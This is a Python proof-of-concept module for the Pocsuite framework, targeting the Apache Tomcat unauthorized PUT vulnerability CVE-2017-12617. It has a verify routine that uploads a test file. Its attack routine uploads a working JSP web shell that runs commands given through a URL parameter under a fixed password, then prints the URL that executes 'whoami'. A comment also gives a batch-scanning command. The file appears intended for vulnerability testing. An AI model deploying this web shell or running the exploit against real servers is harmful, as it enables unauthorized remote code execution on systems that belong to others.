#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

import urlparse

class TomcatPOC(POCBase):
    vulID = '18'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-10-27' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-10-27'# 编写 PoC 的日期
    updateDate = '2017-10-27'# PoC 更新的时间,默认和编写时间一样
    references = 'https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py','http://www.freebuf.com/vuls/150203.html'# 漏洞地址来源,0day不用写
    name = 'tomcat Unauthorized PUT'# PoC 名称
    appPowerLink = 'http://tomcat.apache.org/'# 漏洞厂商主页地址
    appName = 'tomcat'# 漏洞应用名称
    appVersion = 'Apache Tomcat 7.0.0 - 7.0.81'# 漏洞影响版本
    vulType = 'cmd-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        CVE-2017-12617 tomcat PUT 漏洞；
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #如果设置端口则取端口,没有设置则为默认端口
    def host_port(self,vul_url):
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "8080"
        #组装 http, https会出现问题
        vul_url = "http://"+_host+":"+_port
        return vul_url

    #验证漏洞 pocsuite -r 18-tomcat-CVE201712617.py -u 10.74.52.91 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        #获取处理后的url
        vul_url = self.host_port(vul_url)

        #定义poc路径和payload
        poc_path = urlparse.urljoin(vul_url,"test.txt")
        payload = "this is Vulnerable cve201712617!"

        #检测漏洞
        try:
            #print urlparse.urljoin(vul_url,poc_name)
            poc_req = req.put(url = poc_path,data = payload, verify = False)
            #print poc_req.content
            poc_content = req.get(url = poc_path).content
            #print poc_content
            if 'cve201712617' in poc_content:
                #print u'\n【警告】' + vul_url + "【存在漏洞】"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = poc_path
                result['VerifyInfo']['Payload'] = payload
            else:
                #print u'\n【不存在漏洞】 ' + vul_url
                pass
        except:
            # return vul_url
            pass
        print '[+]18 poc done'
        return self.save_output(result)

    #漏洞攻击 pocsuite -r 15-tomcat-CVE201712617.py -u 10.74.52.91 --attack
    def _attack(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        #获取处理后的url
        vul_url = self.host_port(vul_url)

        #定义poc文件名和payload
        poc_name = "cmd.jsp"
        payload = """
        <%
            if("023".equals(request.getParameter("pwd"))){
                java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                int a = -1;
                byte[] b = new byte[2048];
                out.print("<pre>");
                while((a=in.read(b))!=-1){
                    out.println(new String(b));
                }
                out.print("</pre>");
            }
        %>
        """

        #上传jsp会发生问题,必要时手工尝试 完善exp规则
        poc_req = req.put(url = urlparse.urljoin(vul_url,poc_name),data = payload, verify = False)
        exp = urlparse.urljoin(vul_url,poc_name)+"?pwd=023&i=whoami"
        print exp
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = urlparse.urljoin(vul_url,poc_name)
        result['VerifyInfo']['Payload'] = exp

        return self.save_output(result)

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(TomcatPOC)





"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

批量验证 pocsuite -r 18-tomcat-CVE201712617.py --verify -f results.txt --threads 10 --report report.html

"""